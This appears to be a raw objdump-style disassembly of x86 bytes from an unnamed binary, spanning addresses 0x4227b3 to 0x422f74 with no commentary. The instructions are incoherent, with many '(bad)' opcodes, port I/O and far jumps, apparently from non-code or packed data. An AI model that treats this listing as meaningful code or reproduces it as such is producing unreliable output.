  4227b3:	int3   
  4227b4:	inc    eax
  4227b5:	fdivp  st(1),st
  4227b7:	out    dx,eax
  4227b8:	ja     0x422794
  4227ba:	or     ebx,esi
  4227bc:	pop    edi
  4227bd:	(bad)  
  4227be:	xor    al,0x27
  4227c0:	iret   
  4227c1:	frstor [eax+0x3ae0001]
  4227c7:	add    BYTE PTR [eax],al
  4227c9:	dec    ebx
  4227ca:	xlat   BYTE PTR ds:[ebx]
  4227cb:	popa   
  4227cc:	(bad)  
  4227ce:	add    bh,0xed
  4227d1:	(bad)
  4227d4:	jp     0x4227dd
  4227d6:	lock aaa 
  4227d8:	push   0xffffffb8
  4227da:	jae    0x42275f
  4227dc:	cld    
  4227dd:	cwde   
  4227de:	jle    0x4227b7
  4227e0:	aad    0x1f
  4227e2:	and    al,0x40
  4227e4:	test   eax,0xa2e12227
  4227e9:	sbb    bh,BYTE PTR [edx-0x46f504fb]
  4227ef:	das    
  4227f0:	pop    edx
  4227f1:	mov    bh,ah
  4227f3:	popa   
  4227f4:	test   eax,0x88628c15
  4227f9:	xor    esi,edi
  4227fb:	inc    DWORD PTR [ecx]
  4227fd:	je     0x4227a4
  4227ff:	popa   
  422800:	pop    edx
  422801:	push   ecx
  422802:	sar    BYTE PTR [ecx+0x20],cl
  422805:	iret   
  422806:	pop    ebp
  422807:	jg     0x4227cf
  422809:	push   esp
  42280a:	mov    esp,0x97b46b7
  42280f:	adc    cl,cl
  422811:	fcmovnb st,st(5)
  422813:	mov    eax,0x3d87221d
  422818:	aam    0x32
  42281a:	and    esp,esi
  42281c:	fistp  DWORD PTR [edi+ecx*2+0x57]
  422820:	das    
  422821:	inc    ebp
  422822:	repnz mov dl,0x3a
  422825:	inc    edi
  422826:	js     0x422806
  422828:	dec    eax
  422829:	pop    es
  42282a:	sub    edx,DWORD PTR [ecx+0x5a]
  42282d:	dec    ebx
  42282e:	sub    eax,0xf0a05ba2
  422833:	adc    ecx,ebx
  422835:	mov    dl,BYTE PTR [ebx-0x62]
  422838:	mov    bl,0x53
  42283a:	mov    eax,ds:0xa8d2bbd6
  42283f:	psubsw mm1,QWORD PTR [edi]
  422842:	lahf   
  422843:	or     cl,BYTE PTR [eax+0x6f]
  422846:	repz mov esi,0x33bea17b
  42284c:	shr    BYTE PTR [ebx+eax*2-0x80],cl
  422850:	cwde   
  422851:	in     eax,dx
  422852:	and    eax,0xffed7efe
  422857:	mov    esi,0x719a1331
  42285c:	imul   esi,DWORD PTR [edx+0x6e9e938e],0xffffffb4
  422863:	inc    edx
  422864:	mov    ecx,0xacad7458
  422869:	mov    edx,0x5fa0df75
  42286e:	fisttp QWORD PTR [ebx-0x740a8ec0]
  422874:	lods   eax,DWORD PTR ds:[esi]
  422875:	mov    ah,0x8e
  422877:	jno    0x42282a
  422879:	es adc eax,0x850c23fb
  42287f:	(bad)  
  422880:	cmp    al,0x9d
  422882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422883:	cmp    bl,ah
  422885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422886:	and    eax,0x74e9a002
  42288b:	mov    ebx,0x85ff70e5
  422890:	cmp    al,0x95
  422892:	pusha  
  422893:	addps  xmm6,XMMWORD PTR [ecx-0x6958881f]
  42289a:	rol    DWORD PTR [ebp+ecx*4-0x53f380ba],cl
  4228a1:	leave  
  4228a2:	test   DWORD PTR [esi],esi
  4228a4:	xchg   DWORD PTR [edi-0x29],ecx
  4228a7:	dec    ebx
  4228a8:	xchg   ebx,eax
  4228a9:	or     eax,0x5e4e0972
  4228ae:	ror    DWORD PTR [eax+0x663385ba],1
  4228b4:	(bad)  
  4228b5:	fisttp DWORD PTR [esi+0x72]
  4228b8:	add    DWORD PTR [ebx+0x65],ebp
  4228bb:	add    DWORD PTR ds:[eax-0x22acafb7],edi
  4228c2:	sbb    cl,BYTE PTR [esi-0x2e]
  4228c5:	stos   BYTE PTR es:[edi],al
  4228c6:	pushf  
  4228c7:	fistp  WORD PTR [esi+esi*4]
  4228ca:	popa   
  4228cb:	dec    edi
  4228cc:	clc    
  4228cd:	fs dec eax
  4228cf:	inc    esp
  4228d0:	and    esi,DWORD PTR [esi]
  4228d2:	aam    0x52
  4228d4:	aam    0x2c
  4228d6:	loopne 0x4228fc
  4228d8:	jns    0x422953
  4228da:	jl     0x422959
  4228dc:	or     ebp,eax
  4228de:	outs   dx,BYTE PTR ds:[esi]
  4228df:	out    0xbf,al
  4228e1:	ins    DWORD PTR es:[edi],dx
  4228e2:	ja     0x422905
  4228e4:	sbb    dh,BYTE PTR [esi+edi*4-0x41]
  4228e8:	bound  edx,QWORD PTR [ecx-0x15d1e753]
  4228ee:	sbb    DWORD PTR [ebp+0x1422593],edx
  4228f4:	sbb    DWORD PTR [edi-0x4e40c8e1],esp
  4228fa:	rcr    BYTE PTR ss:[eax+0x7c52bc90],1
  422901:	and    al,0xf9
  422903:	pop    esp
  422904:	add    ebx,eax
  422906:	paddusb mm7,QWORD PTR [edi*1-0x6dca1a54]
  42290e:	sahf   
  42290f:	xchg   edi,eax
  422910:	pusha  
  422911:	mov    ebp,0x997ac7d3
  422916:	push   esp
  422917:	rcl    DWORD PTR [ecx-0x17],1
  42291a:	xchg   edi,eax
  42291b:	adc    BYTE PTR [ecx+0x33],al
  42291e:	dec    esp
  42291f:	mov    bl,ah
  422921:	lods   eax,DWORD PTR gs:[esi]
  422923:	and    eax,0x8fff3b8e
  422928:	outs   dx,DWORD PTR ds:[esi]
  422929:	mov    bh,BYTE PTR [edx-0x2ec63293]
  42292f:	jae    0x42296a
  422931:	mov    ah,dh
  422933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422934:	test   eax,0x66176ae1
  422939:	fs sbb al,0x51
  42293c:	cli    
  42293d:	xchg   edi,eax
  42293e:	je     0x4228d0
  422940:	inc    eax
  422941:	les    ebp,FWORD PTR ds:0xbaa36736
  422947:	retf   
  422948:	mov    dh,0x84
  42294a:	sbb    esp,esi
  42294c:	aas    
  42294d:	test   al,0xb8
  42294f:	dec    ecx
  422950:	scas   eax,DWORD PTR es:[edi]
  422951:	call   0x134e317d
  422956:	push   es
  422957:	cs ret 
  422959:	(bad)
  42295d:	xchg   ebx,eax
  42295e:	and    BYTE PTR [eax+0x2b],dh
  422961:	popa   
  422962:	in     al,0x49
  422964:	push   ds
  422965:	ret    0xd61f
  422968:	dec    edi
  422969:	sahf   
  42296a:	jno    0x4228f8
  42296c:	hlt    
  42296d:	mov    ebp,0x39b3651b
  422972:	(bad)  
  422973:	and    BYTE PTR [edx+0x76],dh
  422976:	gs push cs
  422978:	fs leave 
  42297a:	pop    ebp
  42297b:	lods   eax,DWORD PTR ds:[esi]
  42297c:	loope  0x4229b7
  42297e:	xchg   edx,eax
  42297f:	adc    ebp,DWORD PTR [edx-0x5449853f]
  422985:	push   es
  422986:	jo     0x422955
  422988:	shl    BYTE PTR [esi],1
  42298a:	push   ebp
  42298b:	sar    BYTE PTR [ecx-0x58],cl
  42298e:	stos   BYTE PTR es:[edi],al
  42298f:	adc    DWORD PTR [edi+0x53f8e6c1],ecx
  422995:	push   edi
  422996:	sbb    cl,bl
  422998:	fnsave cs:[ebx]
  42299b:	sub    DWORD PTR [edi+0x1a],esi
  42299e:	mov    eax,0x9926bc8c
  4229a3:	xchg   edx,eax
  4229a4:	inc    edx
  4229a5:	dec    DWORD PTR [edi]
  4229a7:	adc    al,0xe7
  4229a9:	leave  
  4229aa:	mov    ebp,0x49635871
  4229af:	and    dh,0x28
  4229b2:	pop    ds
  4229b3:	addr16 inc eax
  4229b5:	xor    BYTE PTR [esi-0x4bc5d3db],bh
  4229bb:	stos   BYTE PTR es:[edi],al
  4229bc:	add    DWORD PTR [esi-0x74657e97],ebp
  4229c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229c3:	aad    0xf8
  4229c5:	mov    esi,0xf5f00637
  4229ca:	adc    eax,0xdf1ad6a9
  4229cf:	les    eax,FWORD PTR [esi]
  4229d1:	fiadd  DWORD PTR [ecx-0x1c]
  4229d4:	mov    WORD PTR [esp+edi*4+0x3ba1a56],ss
  4229db:	jo     0x422986
  4229dd:	test   al,0x31
  4229df:	adc    al,0xc5
  4229e1:	in     al,0x2a
  4229e3:	lahf   
  4229e4:	retf   0xaa50
  4229e7:	xchg   edx,eax
  4229e8:	test   BYTE PTR [eax+0x45],dh
  4229eb:	push   ds
  4229ec:	jne    0x4229d6
  4229ee:	iret   
  4229ef:	rol    BYTE PTR [eax+0x24],1
  4229f2:	rol    DWORD PTR [esi-0x32],1
  4229f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229f6:	mov    ebp,0x2e1a58be
  4229fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229fc:	push   es
  4229fd:	and    eax,DWORD PTR [ebx+0x3fb04073]
  422a03:	pop    es
  422a04:	or     edx,ebp
  422a06:	and    BYTE PTR [edx+0x321353c0],al
  422a0c:	pop    esi
  422a0d:	lds    edi,FWORD PTR [ebx+0x23e6fbc8]
  422a13:	push   esp
  422a14:	inc    ebx
  422a15:	xchg   ebp,eax
  422a16:	jge    0x422a33
  422a18:	and    al,0x18
  422a1a:	mov    ah,0xc4
  422a1c:	mov    ah,0x29
  422a1e:	pop    ebp
  422a1f:	mov    ebx,0x7cb075ea
  422a24:	and    al,0x6d
  422a26:	mov    ah,bh
  422a28:	cmp    edx,0x53ce36f3
  422a2e:	jns    0x422a36
  422a30:	and    eax,0x5035d64a
  422a35:	mov    eax,0xe1e9b04c
  422a3a:	in     eax,dx
  422a3b:	pavgw  mm5,QWORD PTR [edx-0x24da21d5]
  422a42:	jl     0x422a17
  422a44:	jecxz  0x422a93
  422a46:	xchg   edi,eax
  422a47:	cwde   
  422a48:	mov    ebx,0xbf85c7c0
  422a4d:	out    dx,al
  422a4e:	sbb    esi,esi
  422a50:	sbb    dl,BYTE PTR [esi]
  422a52:	aad    0x89
  422a54:	fstp   QWORD PTR [edx]
  422a56:	jle    0x4229ff
  422a58:	out    0xcf,eax
  422a5a:	ret    0x92bf
  422a5d:	pop    edi
  422a5e:	fld    QWORD PTR [ebx+0x7f]
  422a61:	mov    ds:0xedea1421,al
  422a66:	hlt    
  422a67:	sub    DWORD PTR [ecx-0x54],edx
  422a6a:	stc    
  422a6b:	mov    ebp,0x4584e333
  422a70:	in     eax,0xd8
  422a72:	daa    
  422a73:	jns    0x422abe
  422a75:	sbb    al,0x81
  422a77:	pcmpgtd mm3,QWORD PTR [ecx]
  422a7a:	add    eax,0x58ab7754
  422a7f:	repnz cmp al,BYTE PTR [eax+0x1]
  422a83:	lods   eax,DWORD PTR ds:[esi]
  422a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a85:	popa   
  422a86:	mov    ds:0x12cb551e,al
  422a8b:	mov    cl,0x34
  422a8d:	pop    esp
  422a8e:	pop    ss
  422a8f:	sub    ch,al
  422a91:	call   DWORD PTR [edi]
  422a93:	pusha  
  422a94:	repnz pop ss
  422a96:	inc    edx
  422a97:	and    edx,DWORD PTR [ebp+0x76137021]
  422a9d:	jnp    0x422a32
  422a9f:	nop
  422aa0:	pop    esp
  422aa1:	jno    0x422a64
  422aa3:	adc    al,0x3
  422aa5:	lds    esi,FWORD PTR ds:0x2a95a536
  422aab:	pop    esp
  422aac:	or     ecx,DWORD PTR [ebx]
  422aae:	test   al,0xdf
  422ab0:	or     cl,0x62
  422ab3:	out    0xc3,al
  422ab5:	ret    
  422ab6:	js     0x422a99
  422ab8:	test   eax,0x3ededdfa
  422abd:	inc    esp
  422abe:	out    0x2a,eax
  422ac0:	jb     0x422ab9
  422ac2:	push   0x43
  422ac4:	mov    ds:0xeec2d16e,al
  422ac9:	popa   
  422aca:	dec    ebx
  422acb:	xor    al,0xb5
  422acd:	add    eax,0xa56224b7
  422ad2:	push   0xf6177b2c
  422ad7:	push   cs
  422ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ad9:	mov    dl,0x3e
  422adb:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  422add:	or     eax,0x7df1ad45
  422ae2:	sti    
  422ae3:	and    eax,0xa6b2d0f5
  422ae8:	add    al,ch
  422aea:	sbb    cl,ah
  422aec:	ja     0x422b49
  422aee:	ins    DWORD PTR es:[edi],dx
  422aef:	mov    eax,0x74c31390
  422af4:	fprem  
  422af6:	or     al,0x7e
  422af8:	ds stos BYTE PTR es:[edi],al
  422afa:	cmp    al,BYTE PTR ds:0x7d82cc26
  422b00:	sbb    al,0x35
  422b02:	stos   BYTE PTR es:[edi],al
  422b03:	cmp    DWORD PTR [edx+ebx*4-0x349b11be],eax
  422b0a:	hlt    
  422b0b:	sbb    eax,0x6a8421d7
  422b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b11:	push   edx
  422b12:	pop    ebp
  422b13:	test   eax,0x58705015
  422b18:	mov    edx,0xdf41bfbb
  422b1d:	repnz sub al,0xcb
  422b20:	pop    ds
  422b21:	mov    ds:0x7c7adfac,al
  422b26:	out    dx,al
  422b27:	bound  esp,QWORD PTR [eax-0x13]
  422b2a:	xor    ah,BYTE PTR [eax]
  422b2c:	(bad)  
  422b2d:	fist   WORD PTR [ebp-0x7d]
  422b30:	xchg   ebp,eax
  422b31:	out    0xd,al
  422b33:	ins    BYTE PTR es:[edi],dx
  422b34:	push   esi
  422b35:	aam    0x37
  422b37:	or     eax,0x49a77c25
  422b3c:	push   esp
  422b3d:	idiv   DWORD PTR [eax]
  422b3f:	cmp    ebp,DWORD PTR [edi-0x7173505a]
  422b45:	rol    DWORD PTR fs:[edi+0x299b636f],0x38
  422b4d:	ret    0xf104
  422b50:	pusha  
  422b51:	test   eax,0x270ca86d
  422b56:	xor    BYTE PTR [esi+eiz*8],cl
  422b59:	adc    eax,0xcd64875c
  422b5e:	pop    ebx
  422b5f:	mov    es,esp
  422b61:	cmp    eax,0x93c82ddf
  422b66:	mov    dh,0xb8
  422b68:	adc    eax,0x69ba072
  422b6d:	pop    eax
  422b6e:	lds    ecx,FWORD PTR [ecx+ebp*2]
  422b71:	out    dx,al
  422b72:	out    0xd9,eax
  422b74:	ja     0x422bc4
  422b76:	mov    al,ds:0x0
  422b7b:	add    BYTE PTR [eax],al
  422b7d:	add    BYTE PTR [eax],al
  422b7f:	add    BYTE PTR [eax],al
  422b81:	mov    al,ds:0xbc09b42c
  422b86:	cdq    
  422b87:	mov    ebp,0x52812ad
  422b8c:	xor    dl,BYTE PTR [edx]
  422b8e:	mov    dl,0xeb
  422b90:	fmul   DWORD PTR [ebx-0x51fffe5c]
  422b96:	add    eax,DWORD PTR [eax]
  422b98:	add    BYTE PTR [edx+0x39],dh
  422b9b:	ins    DWORD PTR es:[edi],dx
  422b9c:	jmp    FWORD PTR [ecx+esi*4-0x2b]
  422ba0:	loope  0x422b92
  422ba2:	jle    0x422c15
  422ba4:	pushf  
  422ba5:	retf   
  422ba6:	ret    0xf12f
  422ba9:	push   0x1e55a573
  422bae:	cld    
  422baf:	out    0x3a,al
  422bb1:	mov    cl,0x78
  422bb3:	pop    edx
  422bb4:	in     al,0xed
  422bb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bb8:	dec    eax
  422bb9:	xchg   edx,eax
  422bba:	jae    0x422bc9
  422bbc:	leave  
  422bbd:	(bad)  
  422bbe:	and    ecx,DWORD PTR [ebx]
  422bc0:	mov    ecx,0xee2b0167
  422bc5:	stc    
  422bc6:	pop    ebp
  422bc7:	cmp    DWORD PTR [edi],edx
  422bc9:	aam    0x99
  422bcb:	sub    ecx,DWORD PTR [ebx]
  422bcd:	in     al,0x1f
  422bcf:	xor    eax,ebp
  422bd1:	out    dx,eax
  422bd2:	lock push ebx
  422bd4:	dec    edx
  422bd5:	mov    gs,WORD PTR [eax]
  422bd7:	push   esp
  422bd8:	jnp    0x422c54
  422bda:	mov    ecx,0xea0e5ab9
  422bdf:	test   DWORD PTR [ebp+0x7e],ebx
  422be2:	(bad)  
  422be3:	sub    eax,0xa9dc4bbc
  422be8:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bea:	nop
  422beb:	xor    BYTE PTR [edi+0x1be436bc],dl
  422bf1:	mov    edx,0x49b8ccfd
  422bf6:	mov    dh,0x23
  422bf8:	dec    ebx
  422bf9:	(bad)  
  422bfa:	fnstenv [ecx-0x73]
  422bfd:	sub    edi,esp
  422bff:	in     al,0x84
  422c01:	xor    al,0x55
  422c03:	mov    eax,0xafd299b8
  422c08:	ds dec ebp
  422c0a:	jno    0x422bf7
  422c0c:	imul   eax,DWORD PTR [ecx+0x4af88468],0x5eb871c2
  422c16:	push   edi
  422c17:	std    
  422c18:	jnp    0x422c1b
  422c1a:	fsubr  st,st(3)
  422c1c:	mov    cl,0x3d
  422c1e:	rcl    BYTE PTR [esi-0x1544a89a],0xa7
  422c25:	or     dl,BYTE PTR [eax-0x7a]
  422c28:	call   FWORD PTR [ecx-0x1458b6c6]
  422c2e:	lock mov ecx,0x5a974f09
  422c34:	jl     0x422c74
  422c36:	imul   ebx,DWORD PTR [ebx],0xfcebac88
  422c3c:	sub    ch,BYTE PTR [edi+0x46]
  422c3f:	adc    DWORD PTR [ebx-0x46],ecx
  422c42:	sbb    ah,dl
  422c44:	dec    esi
  422c45:	sub    eax,0x63e22b8a
  422c4a:	xchg   ecx,eax
  422c4b:	in     eax,0xaf
  422c4d:	adc    eax,0xd684c9d7
  422c52:	mov    fs,edx
  422c54:	mov    WORD PTR [eax],ss
  422c56:	sub    DWORD PTR [edx+0x55d9ac15],esp
  422c5c:	push   edx
  422c5d:	add    dh,BYTE PTR [edx+0x4c176848]
  422c63:	push   es
  422c64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c65:	cmp    DWORD PTR [ecx+0x65],esi
  422c68:	ss mov ebx,0x636da485
  422c6e:	xchg   ebx,eax
  422c6f:	sub    ebx,edi
  422c71:	sbb    eax,edx
  422c73:	mov    al,0x51
  422c75:	test   BYTE PTR [edi+0x2],cl
  422c78:	xor    al,0xcb
  422c7a:	mov    ch,BYTE PTR [eax]
  422c7c:	or     eax,0x66e8d79c
  422c81:	cmp    ecx,DWORD PTR [ecx]
  422c83:	sti    
  422c84:	push   0x88402183
  422c89:	outs   dx,BYTE PTR ds:[esi]
  422c8a:	mov    ecx,DWORD PTR [edi-0x58]
  422c8d:	ret    0x590f
  422c90:	inc    edx
  422c91:	cmp    edi,DWORD PTR [ecx+0x5b88cb7c]
  422c97:	sub    eax,ebp
  422c99:	add    DWORD PTR [ecx],esi
  422c9b:	in     al,dx
  422c9c:	ins    BYTE PTR es:[edi],dx
  422c9d:	jno    0x422c38
  422c9f:	jle    0x422c60
  422ca1:	mov    ebx,0x208cace5
  422ca6:	mov    ds:0x9b4a7526,eax
  422cab:	dec    esp
  422cac:	cmp    edx,DWORD PTR [esi]
  422cae:	call   0x7d1e:0x245ba519
  422cb5:	mov    al,ds:0xb3a7f118
  422cba:	aaa    
  422cbb:	pusha  
  422cbc:	sub    esp,DWORD PTR [eax+eax*4]
  422cbf:	xlat   BYTE PTR ds:[ebx]
  422cc0:	sbb    DWORD PTR [edi],ebx
  422cc2:	push   esp
  422cc3:	in     al,0xd0
  422cc5:	inc    ebx
  422cc6:	push   0xffffffe2
  422cc8:	mov    ch,0x14
  422cca:	ins    BYTE PTR es:[edi],dx
  422ccb:	adc    esp,DWORD PTR [esp+eiz*2+0x299862d3]
  422cd2:	dec    esp
  422cd3:	ins    DWORD PTR es:[edi],dx
  422cd4:	jmp    0x422cd8
  422cd6:	push   edx
  422cd7:	jbe    0x422d4a
  422cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cda:	inc    edx
  422cdb:	jl     0x422d1d
  422cdd:	jl     0x422ce3
  422cdf:	mov    eax,ds:0x527afb80
  422ce4:	aad    0x53
  422ce6:	add    bl,BYTE PTR [ebx]
  422ce8:	cmp    DWORD PTR [ebx],esp
  422cea:	cli    
  422ceb:	adc    eax,0x58736016
  422cf0:	xor    BYTE PTR [eax-0x7b],dh
  422cf3:	in     eax,0x23
  422cf5:	adc    DWORD PTR [ecx+0x15b6d83f],edi
  422cfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cfc:	out    dx,al
  422cfd:	fucomi st,st(3)
  422cff:	(bad)  
  422d01:	ret    
  422d02:	and    eax,0xd2a29514
  422d07:	addr16 mov eax,0x143abaa0
  422d0d:	adc    DWORD PTR [eax],ebp
  422d0f:	sbb    BYTE PTR [edx],bl
  422d11:	(bad)  
  422d12:	sbb    edx,eax
  422d14:	cld    
  422d15:	xor    esp,esp
  422d17:	aad    0xa4
  422d19:	test   BYTE PTR [eax+0x43],0xa7
  422d1d:	mov    BYTE PTR [ecx+eax*4],0x6c
  422d21:	sbb    eax,0x335fcfe0
  422d26:	addr16 mov edi,0x265228f5
  422d2c:	or     al,0xf0
  422d2e:	daa    
  422d2f:	pop    edi
  422d30:	(bad)  
  422d31:	pushf  
  422d32:	les    eax,FWORD PTR [ebx-0x67]
  422d35:	aam    0xfd
  422d37:	ret    0xc6b7
  422d3a:	aad    0x68
  422d3c:	adc    eax,0x989a298e
  422d41:	sub    dh,BYTE PTR [edi]
  422d43:	and    dl,BYTE PTR [ebp+eax*4-0x1077ee2d]
  422d4a:	inc    ebx
  422d4b:	add    ah,bh
  422d4d:	mov    esi,0xd2961b02
  422d52:	dec    edi
  422d53:	cwde   
  422d54:	mov    al,ds:0x6ca8cd65
  422d59:	add    BYTE PTR [esi-0x31],ch
  422d5c:	sub    eax,0x777dcbaf
  422d61:	dec    esi
  422d62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d63:	rcl    DWORD PTR [edi],0xd
  422d66:	test   al,0x80
  422d68:	test   eax,0x8319aa81
  422d6d:	dec    esp
  422d6e:	sub    eax,0x356ff693
  422d73:	mov    al,ds:0xe48b281
  422d78:	mov    cs,WORD PTR [eax]
  422d7a:	mov    al,0x9d
  422d7c:	push   esi
  422d7d:	adc    eax,0x80db7ced
  422d82:	dec    edx
  422d83:	pop    ss
  422d84:	pop    ecx
  422d85:	jg     0x422d51
  422d87:	push   ss
  422d88:	xchg   esi,eax
  422d89:	arpl   WORD PTR [ecx+0x78],sp
  422d8c:	je     0x422db5
  422d8e:	mov    BYTE PTR [edx+0x2f],0x19
  422d92:	push   edi
  422d93:	nop    ebp
  422d96:	fidiv  WORD PTR [ecx]
  422d98:	cmp    DWORD PTR [ecx-0x5b],0xb9ae629f
  422d9f:	int    0x3b
  422da1:	test   BYTE PTR [esp+edx*4-0x43aa78f3],ch
  422da8:	test   bh,bl
  422daa:	sub    esi,ebx
  422dac:	lahf   
  422dad:	inc    bl
  422daf:	mov    edi,DWORD PTR [eax+0x31c1dea3]
  422db5:	mov    WORD PTR [esi+0xf],ss
  422db8:	sbb    eax,0x7334e35b
  422dbd:	jnp    0x422da6
  422dbf:	xor    DWORD PTR [eax+edi*4+0x16],ebp
  422dc3:	xor    al,0xeb
  422dc5:	loope  0x422e3b
  422dc7:	(bad)  
  422dc8:	pushf  
  422dc9:	jae    0x422d92
  422dcb:	mov    ebx,0x23aa2fde
  422dd0:	repnz fist DWORD PTR [edx+edi*8+0x70]
  422dd5:	stos   BYTE PTR es:[edi],al
  422dd6:	je     0x422e50
  422dd8:	jne    0x422dab
  422dda:	es adc esi,edi
  422ddd:	fadd   st,st(2)
  422ddf:	or     bl,BYTE PTR [ecx-0xd]
  422de2:	enter  0xe4e,0x1c
  422de6:	push   esp
  422de7:	fsub   QWORD PTR [edi+0x19]
  422dea:	ins    BYTE PTR es:[edi],dx
  422deb:	mov    al,ds:0x656363f1
  422df0:	dec    esp
  422df1:	cmp    BYTE PTR [ebp-0x52280f3d],bh
  422df7:	in     eax,dx
  422df8:	fsubr  QWORD PTR [ebx]
  422dfa:	push   edx
  422dfb:	adc    ebp,DWORD PTR [edi+0x55]
  422dfe:	mov    ecx,0x5e990b27
  422e03:	add    BYTE PTR [eax+0x2],0xb4
  422e07:	or     BYTE PTR [ebx+0x25],ah
  422e0a:	icebp  
  422e0b:	mov    eax,0x2f4f972c
  422e10:	push   eax
  422e11:	jg     0x422dcb
  422e13:	mov    ecx,0x9d3fe291
  422e18:	or     DWORD PTR [esi],ebx
  422e1a:	jb     0x422dc4
  422e1c:	data16 rcr BYTE PTR [ebx-0x4a98cc81],1
  422e23:	and    DWORD PTR [eax+ebx*8],esp
  422e26:	outs   dx,BYTE PTR ds:[esi]
  422e27:	xchg   esi,ecx
  422e29:	es cwde 
  422e2b:	pop    eax
  422e2c:	and    ch,BYTE PTR [eax+eiz*2-0x901a45c]
  422e33:	icebp  
  422e34:	hlt    
  422e35:	cwde   
  422e36:	sar    DWORD PTR [edx-0x1d],1
  422e39:	pop    ds
  422e3a:	and    al,0xd1
  422e3c:	cdq    
  422e3d:	cmp    DWORD PTR ds:[ebx],edi
  422e40:	in     al,dx
  422e41:	shl    dh,0x9f
  422e44:	mov    edx,0xc6a0eb4e
  422e49:	cmp    eax,0x160602c1
  422e4e:	call   0xfbd1:0x1c4a8e08
  422e55:	mov    ecx,0xa7e9a35f
  422e5a:	xchg   ebp,eax
  422e5b:	(bad)  
  422e5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e5d:	jo     0x422e2e
  422e5f:	push   ss
  422e60:	loop   0x422ee0
  422e62:	outs   dx,DWORD PTR ds:[esi]
  422e63:	outs   dx,BYTE PTR ds:[esi]
  422e64:	gs push 0xffffff85
  422e67:	mov    esp,0xe9b29504
  422e6c:	sub    al,0xdf
  422e6e:	adc    bh,BYTE PTR ds:0x653a18ca
  422e74:	dec    esp
  422e75:	sbb    DWORD PTR [ecx+0x1],ebx
  422e78:	xchg   ebp,eax
  422e79:	mov    edi,ecx
  422e7b:	sub    DWORD PTR [esi],0x2a6e9742
  422e81:	aas    
  422e82:	aam    0xdc
  422e84:	js     0x422e86
  422e86:	fs and eax,0xaf7949a6
  422e8c:	adc    edi,DWORD PTR [edi]
  422e8e:	push   eax
  422e8f:	test   BYTE PTR [ecx-0x4b],dl
  422e92:	fstp   DWORD PTR [ebx+edi*1+0x3f]
  422e96:	daa    
  422e97:	pop    ebp
  422e98:	xchg   ecx,eax
  422e99:	cdq    
  422e9a:	xor    al,0x53
  422e9c:	stos   DWORD PTR es:[edi],eax
  422e9d:	pop    eax
  422e9e:	stc    
  422e9f:	leave  
  422ea0:	stc    
  422ea1:	in     al,dx
  422ea2:	in     al,dx
  422ea3:	stc    
  422ea4:	add    BYTE PTR [ebp+ecx*1-0x53776d82],0x61
  422eac:	dec    edi
  422ead:	in     eax,dx
  422eae:	dec    ecx
  422eaf:	jmp    0xffa1:0xd68a9265
  422eb6:	or     DWORD PTR [ebx+0x22],eax
  422eb9:	jnp    0x422e3d
  422ebb:	cmp    esp,DWORD PTR [edx+0x38117020]
  422ec1:	mov    ds:0x2a3d0099,eax
  422ec6:	jae    0x422e75
  422ec8:	je     0x422ebe
  422eca:	addr16 sti 
  422ecc:	pop    esi
  422ecd:	mov    bh,0x14
  422ecf:	scas   al,BYTE PTR es:[edi]
  422ed0:	mov    esp,DWORD PTR [ebp-0x17]
  422ed3:	jmp    0x6ded6827
  422ed8:	cwde   
  422ed9:	(bad)  
  422eda:	and    eax,0x1eb7607a
  422edf:	in     al,dx
  422ee0:	and    ecx,edi
  422ee2:	test   al,0x11
  422ee4:	xchg   ecx,eax
  422ee5:	mov    ch,0x7e
  422ee7:	add    eax,esp
  422ee9:	inc    ecx
  422eea:	in     eax,dx
  422eeb:	inc    ecx
  422eec:	mov    ds:0x660371bc,al
  422ef1:	lea    esi,[ebx]
  422ef3:	cmp    BYTE PTR [esp+esi*2-0x56e6b82f],dl
  422efa:	jno    0x422e8a
  422efc:	add    esi,DWORD PTR [ebx-0x52]
  422eff:	int3   
  422f00:	pop    eax
  422f01:	aaa    
  422f02:	pop    ss
  422f03:	inc    ecx
  422f04:	mov    edi,0xd878544d
  422f09:	pop    edx
  422f0a:	or     ecx,ecx
  422f0c:	adc    eax,0xb7f3d31
  422f11:	mov    dh,0x3b
  422f13:	push   esp
  422f14:	test   DWORD PTR [edi+0x6a],0xb2790fc7
  422f1b:	cli    
  422f1c:	dec    ebp
  422f1d:	out    0xc6,al
  422f1f:	inc    esi
  422f20:	push   ss
  422f21:	ins    BYTE PTR es:[edi],dx
  422f22:	adc    ch,0xf8
  422f25:	popa   
  422f26:	xor    esp,DWORD PTR [ebp-0x32cd89c5]
  422f2c:	mov    ds:0xe285728e,al
  422f31:	dec    esi
  422f32:	adc    BYTE PTR [eax+0x21],dl
  422f35:	fldcw  WORD PTR [ecx+0x40]
  422f38:	sbb    DWORD PTR [ecx],edx
  422f3a:	pop    ecx
  422f3b:	xchg   ebx,eax
  422f3c:	jg     0x422f2c
  422f3e:	jb     0x422ed1
  422f40:	mov    esi,0xe3d7fb78
  422f45:	out    0xf3,eax
	...
  422f4f:	add    BYTE PTR [eax],al
  422f51:	add    dh,BYTE PTR [ebx]
  422f53:	mov    edi,DWORD PTR [eax]
  422f55:	mov    ebx,0xb63bb3b8
  422f5a:	fsubp  st(3),st
  422f5c:	mov    bh,0x45
  422f5e:	in     eax,0x90
  422f60:	out    0x39,al
  422f62:	test   al,0x1
  422f64:	add    BYTE PTR [esi+0x1c000003],ch
  422f6a:	mov    bl,0x90
  422f6c:	cdq    
  422f6d:	cwde   
  422f6e:	loop   0x422f64
  422f70:	js     0x422fdc
  422f72:	jne    0x422f18
  422f74:	dec    ecx
